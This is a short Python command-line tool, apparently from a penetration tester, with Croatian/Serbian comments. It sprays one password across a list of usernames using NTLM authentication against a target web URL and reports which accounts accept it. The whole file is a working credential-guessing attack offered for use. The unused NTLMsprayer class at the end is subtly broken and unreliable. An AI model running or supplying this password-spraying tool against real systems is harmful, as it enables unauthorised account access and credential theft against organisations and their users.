#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        #sprayer = NTLMSprayer(fqdn)
        #Dodaj korisnike u array za sprayanje
        usersToAttack=[]
        lines = open(userfile, 'r').readlines()
        for line in lines:
            usersToAttack.append(line.replace("\r", "").replace("\n", "")) #zato sto linije zavrsavaju sa /r/n
        #sprayer.load_users(userfile)
        
        #Izvrsavanje napada
        print("Pokrecem napad sa sifrom: ",password)
        HTTP_AUTH_SUCCEDD_CODE=200
        HTTP_AUTH_FAILED_CODE=401
        for user in usersToAttack:
            response= requests.get(attackurl,auth=HttpNtlmAuth(fqdn+"\\"+user,password))
            if(response.status_code==HTTP_AUTH_SUCCEDD_CODE):
                print("VALIDNI KREDENCIJALI ZA KORISNIKA: ",user)
                continue
        
        #sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])

class NTLMsprayer:
    def __init__(self,users,fqdn,password,attackurl):
        self.users=[]
        self.fqdn=fqdn
        self.password=password
        self.attackurl=attackurl
        lines=open(users,'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r","").replace("\n",""))
        
    def attack(self):
        pass
        for user in self.users:
            response=requests.get(self.attackurl,auth=HttpNtlmAuth(self.fqdn,"\\",self.users,self.password))
            if(response.status_code==200):
                print("Prihvaceno")
        